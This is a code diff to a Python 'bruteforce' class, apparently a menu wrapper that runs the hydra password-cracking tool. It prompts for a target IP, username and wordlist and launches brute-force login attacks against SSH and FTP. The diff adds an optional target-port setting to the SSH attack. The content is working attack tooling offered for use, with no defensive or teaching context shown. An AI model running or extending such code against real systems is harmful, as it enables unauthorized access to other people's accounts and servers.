@@ -54,22 +54,24 @@ class bruteforce:
             sleep(0.5)
             
         if choice == 1:
-            
             ip = bruteforce.get_input("Enter Target IP address : ")
             if not ip:
                 return None
-
             username = bruteforce.get_input("Enter Username : ")
             if not username:
                 return None
-            
             wordlist = bruteforce.get_input("Enter Wordlist : ")
             if not wordlist:
                 return None
-            
+            port = bruteforce.get_input("Enter Target Port <Press Enter For Default> : ")
+
             bruteforce.clear()
-            s.run(["hydra", "-l", username, "-P", wordlist, f"ssh://{ip}", "-V" ])
-        
+
+            if port:
+                s.run(["hydra", "-l", username, "-P", wordlist, "-s", port, f"ssh://{ip}", "-V"])
+            else:
+                s.run(["hydra", "-l", username, "-P", wordlist, f"ssh://{ip}", "-V"])
+            
         if choice == 2:
 
             ip = bruteforce.get_input("Enter Target IP Address : ")
@@ -84,3 +86,4 @@ class bruteforce:
             
             bruteforce.clear()
             s.run(["hydra", "-l", username, "-P", wordlist, f"ftp://{ip}", "-V" ])
+
